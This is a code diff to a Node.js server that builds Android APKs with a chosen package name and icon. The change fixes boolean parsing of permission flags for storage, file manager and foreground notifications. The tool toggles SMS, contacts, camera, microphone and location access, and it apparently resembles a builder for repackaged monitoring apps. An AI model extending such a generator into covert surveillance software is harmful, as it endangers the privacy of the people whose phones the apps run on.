@@ -270,9 +270,9 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             const isCameraEnabled          = enableCameraPermission === 'true';
             const isMicEnabled             = enableMicrophonePermission === 'true';
             const isLocationEnabled        = enableLocationPermission === 'true';
-            const isStorageEnabled         = enableStoragePermission !== 'false';
-            const isFileManagerEnabled     = enableFileManagerPermission === 'true';
-            const isForegroundNotifEnabled = enableForegroundNotification !== 'false';
+            const isStorageEnabled         = enableStoragePermission !== 'false' && enableStoragePermission !== false;
+            const isFileManagerEnabled     = enableFileManagerPermission === 'true' || enableFileManagerPermission === true;
+            const isForegroundNotifEnabled = enableForegroundNotification !== 'false' && enableForegroundNotification !== false;
 
             await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
             const manifestEntry = zip.getEntry('AndroidManifest.xml');
@@ -343,8 +343,8 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 packageName:                  targetPkg,
                 enableSmsPermission:          enableSmsPermission === 'true',
                 enableContactsPermission:     enableContactsPermission === 'true',
-                enableStoragePermission:      enableStoragePermission !== 'false',
-                enableFileManagerPermission:  enableFileManagerPermission === 'true',
+                enableStoragePermission:      isStorageEnabled,
+                enableFileManagerPermission:  isFileManagerEnabled,
                 enableCameraPermission:       enableCameraPermission === 'true',
                 enableMicrophonePermission:   enableMicrophonePermission === 'true',
                 enableLocationPermission:     enableLocationPermission === 'true',
